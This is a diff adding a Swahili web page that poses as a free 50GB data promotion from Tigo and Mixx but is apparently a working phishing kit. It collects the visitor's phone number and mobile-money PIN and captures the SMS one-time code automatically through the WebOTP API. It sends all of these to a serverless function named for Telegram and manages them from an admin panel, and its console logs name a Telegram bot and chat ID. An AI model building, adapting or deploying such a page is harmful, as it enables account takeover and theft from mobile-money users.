@@ -1,0 +1,1197 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mixx 50GB Bure - Tigo</title>
+    <meta name="description" content="Pata 50GB Data Bure kutoka kwa Tigo na Mixx. Jisajili sasa!" />
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📱</text></svg>" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(160deg, #0a0a1a 0%, #1a1a3e 40%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            max-width: 480px;
+            width: 100%;
+            border-radius: 36px;
+            padding: 32px 28px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #e2001a, #ff6b6b, #e2001a);
+            background-size: 200% 100%;
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .hidden { display: none !important; }
+        .text-center { text-align: center; }
+        .mt-8 { margin-top: 8px; }
+        .mt-12 { margin-top: 12px; }
+        .mt-16 { margin-top: 16px; }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+        .logo .mixx { color: #e2001a; }
+        .logo .tigo { color: #0055a4; }
+
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #ffeb3b, #fdd835);
+            padding: 4px 20px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .offer-box {
+            background: linear-gradient(135deg, #e2001a, #b80014);
+            border-radius: 20px;
+            padding: 28px 16px;
+            text-align: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+            margin: 16px 0;
+        }
+
+        .offer-box::after {
+            content: '🎯';
+            position: absolute;
+            right: 12px;
+            bottom: 8px;
+            font-size: 40px;
+            opacity: 0.15;
+        }
+
+        .offer-box .gb {
+            font-size: 58px;
+            font-weight: 900;
+            letter-spacing: 3px;
+            line-height: 1;
+        }
+
+        .offer-box .label {
+            font-size: 22px;
+            font-weight: 700;
+            margin-top: 4px;
+        }
+
+        .offer-box .sub {
+            font-size: 14px;
+            opacity: 0.85;
+            margin-top: 4px;
+        }
+
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #e2001a, #b80014);
+            color: white;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(226, 0, 26, 0.35);
+        }
+        .btn-primary:active { transform: scale(0.97); }
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #1b8a2e, #0f6b1f);
+            color: white;
+        }
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(27, 138, 46, 0.35);
+        }
+
+        .btn-sm {
+            padding: 10px 16px;
+            background: #e2001a;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 13px;
+        }
+        .btn-sm:hover { background: #b80014; }
+        .btn-sm-success { background: #2e7d32; }
+        .btn-sm-success:hover { background: #1b5e20; }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e8e8e8;
+            border-radius: 14px;
+            font-size: 16px;
+            background: #f8f8f8;
+            outline: none;
+            transition: all 0.3s ease;
+            text-align: center;
+            letter-spacing: 2px;
+            font-weight: 500;
+        }
+
+        .form-group input:focus {
+            border-color: #e2001a;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(226, 0, 26, 0.08);
+        }
+
+        .form-group input::placeholder {
+            color: #bbb;
+            font-size: 14px;
+            letter-spacing: 0;
+            font-weight: 400;
+        }
+
+        .form-group .hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
+        }
+        .form-group .hint strong { color: #e2001a; }
+
+        .error-msg {
+            color: #d32f2f;
+            font-size: 13px;
+            padding: 10px 14px;
+            background: #ffebee;
+            border-radius: 10px;
+            display: none;
+            margin-top: 6px;
+            text-align: left;
+        }
+
+        .error-msg.show {
+            display: block;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .welcome-icon {
+            font-size: 64px;
+            text-align: center;
+            margin: 4px 0;
+        }
+
+        .welcome-title {
+            font-size: 26px;
+            font-weight: 900;
+            color: #e2001a;
+            text-align: center;
+            margin: 4px 0;
+        }
+
+        .welcome-sub {
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+        }
+
+        .feature-list {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin: 12px 0;
+        }
+
+        .feature-list .item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 6px 0;
+            font-size: 14px;
+            color: #444;
+        }
+
+        .feature-list .item .icon {
+            font-size: 18px;
+            min-width: 28px;
+        }
+
+        .feature-list .item strong { color: #e2001a; }
+
+        .otp-icon {
+            font-size: 56px;
+            text-align: center;
+            margin: 4px 0;
+        }
+
+        .otp-display-box {
+            background: linear-gradient(135deg, #fff3e0, #ffe0b2);
+            border-radius: 18px;
+            padding: 24px 20px;
+            border: 3px solid #e2001a;
+            text-align: center;
+            transition: all 0.6s ease;
+            margin: 16px 0;
+        }
+
+        .otp-display-box.detected {
+            border-color: #2e7d32;
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+        }
+
+        .otp-display-box .code {
+            font-size: 52px;
+            font-weight: 900;
+            color: #e2001a;
+            letter-spacing: 14px;
+            font-family: 'Courier New', monospace;
+            margin: 4px 0;
+        }
+
+        .otp-display-box.detected .code { color: #2e7d32; }
+
+        .otp-display-box .status {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .otp-display-box .status.waiting { color: #ff9800; }
+        .otp-display-box .status.detected { color: #2e7d32; }
+        .otp-display-box .status.error { color: #d32f2f; }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            margin-top: 12px;
+            overflow: hidden;
+        }
+
+        .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #e2001a, #ff6b6b);
+            width: 0%;
+            border-radius: 4px;
+            animation: progress 60s linear forwards;
+        }
+
+        .progress-bar .fill.detected {
+            animation: none;
+            width: 100%;
+            background: #2e7d32;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .manual-section {
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px dashed #e0e0e0;
+        }
+
+        .manual-section .label {
+            font-size: 13px;
+            color: #999;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .manual-row {
+            display: flex;
+            gap: 8px;
+        }
+
+        .manual-row input {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 18px;
+            letter-spacing: 6px;
+            font-weight: 600;
+            outline: none;
+        }
+
+        .manual-row input:focus {
+            border-color: #e2001a;
+        }
+
+        .success-box {
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            border-radius: 20px;
+            padding: 36px 24px;
+            text-align: center;
+            margin: 8px 0 16px;
+        }
+
+        .success-box .check {
+            font-size: 72px;
+        }
+
+        .success-box h2 {
+            color: #2e7d32;
+            margin-top: 8px;
+            font-size: 26px;
+        }
+
+        .success-box p {
+            color: #444;
+            margin-top: 8px;
+            line-height: 1.7;
+            font-size: 15px;
+        }
+
+        .success-box .telegram-notice {
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+            font-size: 13px;
+            color: #555;
+        }
+
+        .success-box .telegram-notice strong { color: #e2001a; }
+
+        .referral-badge {
+            background: #e3f2fd;
+            border-radius: 10px;
+            padding: 10px 16px;
+            margin: 12px 0;
+            font-size: 13px;
+            color: #555;
+            text-align: center;
+            display: none;
+        }
+
+        .referral-badge strong { color: #1976d2; }
+
+        .footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #bbb;
+            text-align: center;
+        }
+
+        .footer .lock {
+            color: #2e7d32;
+            font-weight: 600;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .back-link {
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 13px;
+            margin-top: 12px;
+            transition: 0.3s;
+            display: block;
+            text-align: center;
+            width: 100%;
+        }
+
+        .back-link:hover { color: #e2001a; }
+
+        .admin-section {
+            margin-top: 20px;
+            padding: 16px;
+            background: #f5f5f5;
+            border-radius: 14px;
+        }
+
+        .admin-section .title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .admin-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .admin-row input {
+            flex: 1;
+            min-width: 60px;
+            padding: 10px 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 13px;
+            outline: none;
+            text-align: center;
+        }
+
+        .admin-row input:focus {
+            border-color: #e2001a;
+        }
+
+        .admin-status {
+            font-size: 12px;
+            color: #2e7d32;
+            margin-top: 8px;
+            display: none;
+            text-align: center;
+        }
+
+        .admin-status.show {
+            display: block;
+        }
+        .admin-status.error {
+            color: #d32f2f;
+        }
+
+        .admin-list {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #666;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .admin-list .item {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .admin-list .item .delete-btn {
+            color: #d32f2f;
+            cursor: pointer;
+            font-weight: 700;
+            background: none;
+            border: none;
+            padding: 0 4px;
+        }
+
+        .admin-list .item .delete-btn:hover { color: #b71c1c; }
+        .admin-list .empty {
+            text-align: center;
+            color: #999;
+            padding: 8px;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 18px;
+                border-radius: 28px;
+            }
+
+            .offer-box .gb {
+                font-size: 42px;
+            }
+
+            .otp-display-box .code {
+                font-size: 36px;
+                letter-spacing: 8px;
+            }
+
+            .welcome-title {
+                font-size: 22px;
+            }
+
+            .admin-row input {
+                min-width: 50px;
+                font-size: 12px;
+                padding: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="app">
+
+        <!-- ===== PAGE 0: WELCOME ===== -->
+        <div id="page0">
+            <div class="logo">
+                <span class="mixx">Mixx</span> <span style="color:#999;font-weight:300;">×</span> <span class="tigo">Tigo</span>
+            </div>
+            <div class="text-center mt-8">
+                <span class="badge">🔥 OFFER YA LEO</span>
+            </div>
+
+            <div class="welcome-icon">🎁</div>
+            <div class="welcome-title">Pata 50GB BURE!</div>
+            <div class="welcome-sub">Kutoka kwa <strong>Mixx</strong> na <strong>Tigo</strong></div>
+
+            <div class="offer-box">
+                <div class="gb">50GB</div>
+                <div class="label">DATA BURE</div>
+                <div class="sub">TZ · TIGO</div>
+            </div>
+
+            <div class="feature-list">
+                <div class="item">
+                    <span class="icon">✅</span>
+                    <span><strong>50GB</strong> Data bure kabisa</span>
+                </div>
+                <div class="item">
+                    <span class="icon">📱</span>
+                    <span>Inafaa kwa mitandao ya kijamii na video</span>
+                </div>
+                <div class="item">
+                    <span class="icon">⏳</span>
+                    <span>Inatumika kwa <strong>siku 30</strong></span>
+                </div>
+                <div class="item">
+                    <span class="icon">📶</span>
+                    <span>Inapatikana kwa wateja <strong>wote</strong> wa Tigo</span>
+                </div>
+            </div>
+
+            <button class="btn btn-primary" id="getStartedBtn">
+                🚀 Nenda → Jisajili Sasa
+            </button>
+
+            <div class="footer">
+                <span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span>
+            </div>
+        </div>
+
+        <!-- ===== PAGE 1: FORM ===== -->
+        <div id="page1" class="hidden">
+            <div class="logo" style="font-size:22px;">
+                <span class="mixx">Mixx</span> <span style="color:#999;font-weight:300;">×</span> <span class="tigo">Tigo</span>
+            </div>
+            <div class="text-center mt-8">
+                <span class="badge">📢 OFFER YA LEO</span>
+            </div>
+
+            <div class="offer-box" style="padding:16px;margin:12px 0;">
+                <div class="gb" style="font-size:38px;">50GB</div>
+                <div class="label" style="font-size:17px;">DATA BURE</div>
+                <div class="sub" style="font-size:12px;">TZ · TIGO</div>
+            </div>
+
+            <h3 style="text-align:center;font-size:18px;margin-bottom:4px;">Jiume na Mixx Offer</h3>
+            <p style="text-align:center;font-size:14px;color:#666;margin-bottom:16px;">
+                Weka namba yako ya simu ya Tigo na Namba ya Siri.
+            </p>
+
+            <div class="form-group">
+                <label>📞 Namba ya Tigo</label>
+                <input type="tel" id="phoneInput" placeholder="Nambari sahihi ya Tigo" maxlength="10" />
+            </div>
+
+            <div class="form-group">
+                <label>🔐 Namba ya Siri (PIN)</label>
+                <input type="password" id="pinInput" placeholder="...." maxlength="5" />
+                <div class="hint">💡 Jaribu: <strong>1234</strong> (kwa majaribio)</div>
+            </div>
+
+            <div class="error-msg" id="formError"></div>
+
+            <button class="btn btn-primary" id="submitBtn">
+                <span id="submitText">→ Endelea</span>
+                <span id="submitSpinner" class="spinner hidden"></span>
+            </button>
+
+            <div class="referral-badge" id="referralBadge">
+                🔗 <strong>Referred by:</strong> <span id="referralCode">N/A</span>
+            </div>
+
+            <button class="back-link" id="backToWelcome1">← Rudi kwenye maelezo</button>
+
+            <!-- Admin -->
+            <div class="admin-section">
+                <div class="title">🔧 Admin - Manage OTPs</div>
+                <div class="admin-row">
+                    <input type="tel" id="adminPhone" placeholder="Phone" maxlength="10" />
+                    <input type="text" id="adminOtp" placeholder="OTP" maxlength="6" />
+                    <input type="text" id="adminReferral" placeholder="Referral" />
+                    <button class="btn-sm btn-sm-success" id="adminAddBtn">Add</button>
+                    <button class="btn-sm" id="adminRefreshBtn" style="background:#666;">↻</button>
+                </div>
+                <div class="admin-status" id="adminStatus"></div>
+                <div class="admin-list" id="adminList">
+                    <div class="empty">No OTPs added yet</div>
+                </div>
+            </div>
+
+            <div class="footer">
+                <span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span>
+            </div>
+        </div>
+
+        <!-- ===== PAGE 2: OTP ===== -->
+        <div id="page2" class="hidden">
+            <div class="logo" style="font-size:22px;">
+                <span class="mixx">Mixx</span> <span style="color:#999;font-weight:300;">×</span> <span class="tigo">Tigo</span>
+            </div>
+
+            <div class="otp-icon">📱</div>
+            <h3 style="text-align:center;font-size:20px;">Subiri Msimbo</h3>
+            <p style="text-align:center;font-size:14px;color:#555;margin-top:4px;">
+                Msimbo wa OTP umetumwa kwa:
+            </p>
+            <p style="text-align:center;font-size:20px;font-weight:700;color:#e2001a;" id="displayPhone">________</p>
+
+            <div class="otp-display-box" id="otpDisplayBox">
+                <div class="code" id="otpCode">••••••</div>
+                <div class="status waiting" id="otpStatus">⏳ Inasubiri msimbo...</div>
+                <div class="progress-bar">
+                    <div class="fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <input type="hidden" id="otpInput" />
+            <div class="error-msg" id="otpError"></div>
+
+            <div class="manual-section" id="manualSection">
+                <div class="label">📝 Hujapata msimbo? Ingiza manually:</div>
+                <div class="manual-row">
+                    <input type="text" id="manualOtpInput" placeholder="______" maxlength="6" />
+                    <button class="btn-sm" id="manualVerifyBtn">Thibitisha</button>
+                </div>
+            </div>
+
+            <button class="back-link" id="backToWelcome2">← Rudi kwenye maelezo</button>
+        </div>
+
+        <!-- ===== PAGE 3: SUCCESS ===== -->
+        <div id="page3" class="hidden">
+            <div class="success-box">
+                <div class="check">🎉</div>
+                <h2>Imefanikiwa!</h2>
+                <p>
+                    <strong>Hongera sana!</strong> Umepata <strong>50GB DATA BURE</strong>
+                    kutoka kwa <strong>Mixx</strong> na <strong>Tigo</strong>.
+                </p>
+                <p style="font-size:14px;color:#666;margin-top:4px;">
+                    Data itaamilishwa ndani ya dakika 5.
+                </p>
+                <div class="telegram-notice">
+                    📋 <strong>Taarifa imetumwa kwa Admin!</strong>
+                    <br /><span id="successReferral" style="color:#555;"></span>
+                </div>
+            </div>
+
+            <button class="btn btn-success" id="doneBtn">✓ Sawa</button>
+        </div>
+
+    </div>
+
+    <script>
+        // =============================================================
+        // CONFIGURATION
+        // =============================================================
+        const API_BASE = '/.netlify/functions/send-to-telegram';
+
+        // =============================================================
+        // DOM REFERENCES
+        // =============================================================
+        const page0 = document.getElementById('page0');
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const page3 = document.getElementById('page3');
+
+        const getStartedBtn = document.getElementById('getStartedBtn');
+
+        const phoneInput = document.getElementById('phoneInput');
+        const pinInput = document.getElementById('pinInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const submitText = document.getElementById('submitText');
+        const submitSpinner = document.getElementById('submitSpinner');
+        const formError = document.getElementById('formError');
+        const referralBadge = document.getElementById('referralBadge');
+        const referralCode = document.getElementById('referralCode');
+
+        const otpInput = document.getElementById('otpInput');
+        const otpCode = document.getElementById('otpCode');
+        const otpStatus = document.getElementById('otpStatus');
+        const otpDisplayBox = document.getElementById('otpDisplayBox');
+        const otpError = document.getElementById('otpError');
+        const displayPhone = document.getElementById('displayPhone');
+        const progressFill = document.getElementById('progressFill');
+        const manualOtpInput = document.getElementById('manualOtpInput');
+        const manualVerifyBtn = document.getElementById('manualVerifyBtn');
+        const manualSection = document.getElementById('manualSection');
+
+        const doneBtn = document.getElementById('doneBtn');
+        const successReferral = document.getElementById('successReferral');
+
+        const adminPhone = document.getElementById('adminPhone');
+        const adminOtp = document.getElementById('adminOtp');
+        const adminReferral = document.getElementById('adminReferral');
+        const adminAddBtn = document.getElementById('adminAddBtn');
+        const adminRefreshBtn = document.getElementById('adminRefreshBtn');
+        const adminStatus = document.getElementById('adminStatus');
+        const adminList = document.getElementById('adminList');
+
+        const backToWelcome1 = document.getElementById('backToWelcome1');
+        const backToWelcome2 = document.getElementById('backToWelcome2');
+
+        // =============================================================
+        // STATE
+        // =============================================================
+        let currentPhone = '';
+        let currentOtp = '';
+        let otpDetected = false;
+
+        // =============================================================
+        // PAGE NAVIGATION
+        // =============================================================
+        function showPage(page) {
+            page0.classList.add('hidden');
+            page1.classList.add('hidden');
+            page2.classList.add('hidden');
+            page3.classList.add('hidden');
+            if (page === 0) page0.classList.remove('hidden');
+            else if (page === 1) page1.classList.remove('hidden');
+            else if (page === 2) page2.classList.remove('hidden');
+            else if (page === 3) page3.classList.remove('hidden');
+        }
+
+        // =============================================================
+        // UTILITY FUNCTIONS
+        // =============================================================
+        function setLoading(btn, textEl, spinnerEl, loading) {
+            if (loading) {
+                btn.disabled = true;
+                textEl.textContent = 'Inasubiri...';
+                spinnerEl.classList.remove('hidden');
+            } else {
+                btn.disabled = false;
+                spinnerEl.classList.add('hidden');
+            }
+        }
+
+        function showError(el, msg) {
+            if (msg) {
+                el.textContent = msg;
+                el.classList.add('show');
+            } else {
+                el.classList.remove('show');
+            }
+        }
+
+        function showAdminStatus(msg, isError = false) {
+            adminStatus.textContent = msg;
+            adminStatus.className = 'admin-status show';
+            if (isError) adminStatus.classList.add('error');
+            setTimeout(() => adminStatus.classList.remove('show'), 5000);
+        }
+
+        // =============================================================
+        // API CALLS
+        // =============================================================
+        async function callAPI(endpoint, data) {
+            try {
+                const response = await fetch(`${API_BASE}${endpoint}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (error) {
+                return { success: false, message: 'Network error' };
+            }
+        }
+
+        async function callAPIGet(endpoint) {
+            try {
+                const response = await fetch(`${API_BASE}${endpoint}`);
+                return await response.json();
+            } catch (error) {
+                return { success: false, message: 'Network error' };
+            }
+        }
+
+        async function callAPIDelete(endpoint) {
+            try {
+                const response = await fetch(`${API_BASE}${endpoint}`, { method: 'DELETE' });
+                return await response.json();
+            } catch (error) {
+                return { success: false, message: 'Network error' };
+            }
+        }
+
+        // =============================================================
+        // ADMIN FUNCTIONS
+        // =============================================================
+        async function refreshAdminList() {
+            try {
+                const result = await callAPIGet('/admin/list-otps');
+                if (result.success && result.data) {
+                    const entries = Object.entries(result.data);
+                    if (entries.length === 0) {
+                        adminList.innerHTML = '<div class="empty">No OTPs added yet</div>';
+                        return;
+                    }
+                    let html = '';
+                    entries.forEach(([phone, data]) => {
+                        html += `
+                            <div class="item">
+                                <span>📱 ${phone} → 🔑 ${data.otp} ${data.referral ? '| 🔗 ' + data.referral : ''}</span>
+                                <button class="delete-btn" data-phone="${phone}">✕</button>
+                            </div>
+                        `;
+                    });
+                    adminList.innerHTML = html;
+                    document.querySelectorAll('.delete-btn').forEach(btn => {
+                        btn.addEventListener('click', async function() {
+                            const phone = this.dataset.phone;
+                            if (confirm(`Delete OTP for ${phone}?`)) {
+                                const result = await callAPIDelete(`/admin/delete-otp/${phone}`);
+                                if (result.success) {
+                                    showAdminStatus(result.message);
+                                    refreshAdminList();
+                                } else {
+                                    showAdminStatus(result.message || 'Error deleting', true);
+                                }
+                            }
+                        });
+                    });
+                }
+            } catch (error) {
+                console.error('Error refreshing admin list:', error);
+            }
+        }
+
+        adminAddBtn.addEventListener('click', async function() {
+            const phone = adminPhone.value.trim();
+            const otp = adminOtp.value.trim();
+            const referral = adminReferral.value.trim();
+
+            if (!phone || !otp) {
+                showAdminStatus('Tafadhali jaza Phone na OTP', true);
+                return;
+            }
+            if (!/^\d{6}$/.test(otp)) {
+                showAdminStatus('OTP lazima iwe tarakimu 6', true);
+                return;
+            }
+
+            try {
+                const result = await callAPI('/admin/add-otp', { phone, otp, referral });
+                if (result.success) {
+                    showAdminStatus(result.message);
+                    adminPhone.value = '';
+                    adminOtp.value = '';
+                    adminReferral.value = '';
+                    refreshAdminList();
+                } else {
+                    showAdminStatus(result.message || 'Error adding OTP', true);
+                }
+            } catch (error) {
+                showAdminStatus('Network error', true);
+            }
+        });
+
+        adminRefreshBtn.addEventListener('click', refreshAdminList);
+
+        // =============================================================
+        // GET STARTED
+        // =============================================================
+        getStartedBtn.addEventListener('click', function() {
+            showPage(1);
+        });
+
+        // =============================================================
+        // BACK TO WELCOME
+        // =============================================================
+        backToWelcome1.addEventListener('click', function() {
+            showPage(0);
+            showError(formError);
+            phoneInput.value = '';
+            pinInput.value = '';
+        });
+
+        backToWelcome2.addEventListener('click', function() {
+            showPage(0);
+            showError(otpError);
+            manualSection.style.display = 'none';
+        });
+
+        // =============================================================
+        // AUTO-DETECT OTP (WebOTP API)
+        // =============================================================
+        async function detectOTP() {
+            if (!('OTPCredential' in window)) {
+                console.log('WebOTP not supported, manual entry only');
+                manualSection.style.display = 'block';
+                return;
+            }
+
+            try {
+                const otp = await navigator.credentials.get({
+                    otp: { transport: ['sms'] }
+                });
+
+                if (otp && otp.code) {
+                    otpDetected = true;
+                    currentOtp = otp.code;
+                    otpInput.value = currentOtp;
+                    otpCode.textContent = currentOtp;
+                    otpStatus.textContent = '✅ Msimbo umepokelewa! Inathibitisha...';
+                    otpStatus.className = 'status detected';
+                    otpDisplayBox.classList.add('detected');
+                    progressFill.classList.add('detected');
+
+                    // Auto-verify
+                    await autoVerifyOTP(currentPhone, currentOtp);
+                }
+            } catch (error) {
+                console.log('OTP detection cancelled or failed:', error);
+                manualSection.style.display = 'block';
+            }
+        }
+
+        // =============================================================
+        // AUTO-VERIFY OTP
+        // =============================================================
+        async function autoVerifyOTP(phone, otp) {
+            try {
+                const result = await callAPI('/verify-otp', { phone, otp });
+
+                if (result.success) {
+                    otpStatus.textContent = '✅ Imethibitishwa!';
+                    otpStatus.className = 'status detected';
+                    otpDisplayBox.classList.add('detected');
+                    progressFill.classList.add('detected');
+
+                    if (result.data && result.data.referral) {
+                        successReferral.textContent = `📱 ${result.data.phone} | 🔗 ${result.data.referral}`;
+                    }
+
+                    setTimeout(() => {
+                        showPage(3);
+                    }, 1500);
+
+                } else {
+                    otpStatus.textContent = '❌ ' + (result.message || 'Msimbo si sahihi.');
+                    otpStatus.className = 'status error';
+                    otpDisplayBox.style.borderColor = '#d32f2f';
+                    showError(otpError, result.message || 'Msimbo si sahihi. Jaribu tena.');
+                    manualSection.style.display = 'block';
+                }
+            } catch (error) {
+                otpStatus.textContent = '❌ Hitilafu ya mtandao.';
+                otpStatus.className = 'status error';
+                showError(otpError, 'Hitilafu ya mtandao. Jaribu tena.');
+                manualSection.style.display = 'block';
+            }
+        }
+
+        // =============================================================
+        // STEP 1: SUBMIT - Validate PIN
+        // =============================================================
+        submitBtn.addEventListener('click', async function() {
+            const phone = phoneInput.value.trim();
+            const pin = pinInput.value.trim();
+
+            showError(formError);
+            manualSection.style.display = 'none';
+            otpDetected = false;
+
+            if (!phone || !pin) {
+                showError(formError, 'Tafadhali jaza namba zote mbili.');
+                return;
+            }
+
+            if (!/^\d{9,10}$/.test(phone.replace(/^0+/, ''))) {
+                showError(formError, 'Namba ya Tigo si sahihi.');
+                return;
+            }
+
+            if (!/^\d{4,5}$/.test(pin)) {
+                showError(formError, 'Namba ya Siri lazima iwe tarakimu 4 au 5.');
+                return;
+            }
+
+            setLoading(submitBtn, submitText, submitSpinner, true);
+
+            try {
+                const result = await callAPI('/verify-pin', { phone, pin });
+
+                if (result.success) {
+                    currentPhone = result.phone || phone;
+                    currentOtp = result.otp || '';
+
+                    displayPhone.textContent = currentPhone;
+                    otpCode.textContent = currentOtp || '••••••';
+                    otpInput.value = currentOtp || '';
+
+                    if (result.referral && result.referral !== 'N/A') {
+                        referralBadge.style.display = 'block';
+                        referralCode.textContent = result.referral;
+                    } else {
+                        referralBadge.style.display = 'none';
+                    }
+
+                    otpStatus.textContent = '⏳ Inasubiri msimbo...';
+                    otpStatus.className = 'status waiting';
+                    otpDisplayBox.classList.remove('detected');
+                    otpDisplayBox.style.borderColor = '#e2001a';
+                    progressFill.classList.remove('detected');
+                    showError(otpError);
+                    manualSection.style.display = 'none';
+
+                    showPage(2);
+
+                    // Start detecting OTP
+                    await detectOTP();
+
+                } else {
+                    showError(formError, result.message || 'Hitilafu. Jaribu tena.');
+                }
+            } catch (error) {
+                showError(formError, 'Hitilafu ya mtandao. Jaribu tena.');
+            } finally {
+                setLoading(submitBtn, submitText, submitSpinner, false);
+                submitText.textContent = '→ Endelea';
+            }
+        });
+
+        // =============================================================
+        // MANUAL VERIFY (Fallback)
+        // =============================================================
+        manualVerifyBtn.addEventListener('click', async function() {
+            const otp = manualOtpInput.value.trim();
+
+            showError(otpError);
+
+            if (!otp) {
+                showError(otpError, 'Tafadhali ingiza msimbo.');
+                return;
+            }
+
+            if (!/^\d{6}$/.test(otp)) {
+                showError(otpError, 'Msimbo lazima uwe tarakimu 6.');
+                return;
+            }
+
+            otpCode.textContent = otp;
+            otpInput.value = otp;
+            otpStatus.textContent = '⏳ Inathibitisha...';
+            otpStatus.className = 'status waiting';
+
+            await autoVerifyOTP(currentPhone, otp);
+        });
+
+        // =============================================================
+        // DONE BUTTON
+        // =============================================================
+        doneBtn.addEventListener('click', function() {
+            phoneInput.value = '';
+            pinInput.value = '';
+            otpInput.value = '';
+            manualOtpInput.value = '';
+            showError(formError);
+            showError(otpError);
+            referralBadge.style.display = 'none';
+            showPage(0);
+        });
+
+        // =============================================================
+        // ENTER KEY SUPPORT
+        // =============================================================
+        phoneInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitBtn.click(); });
+        pinInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitBtn.click(); });
+        manualOtpInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') manualVerifyBtn.click(); });
+
+        // =============================================================
+        // START
+        // =============================================================
+        showPage(0);
+        manualSection.style.display = 'none';
+        refreshAdminList();
+        setInterval(refreshAdminList, 30000);
+
+        console.log('🚀 Mixx Offer App Started!');
+        console.log('📱 Telegram Bot: @Kechitz_bot');
+        console.log('📋 Chat ID: 8834429633');
+        console.log('💡 WebOTP:', 'OTPCredential' in window ? '✅ Supported' : '❌ Not supported');
+    </script>
+
+</body>
+</html>
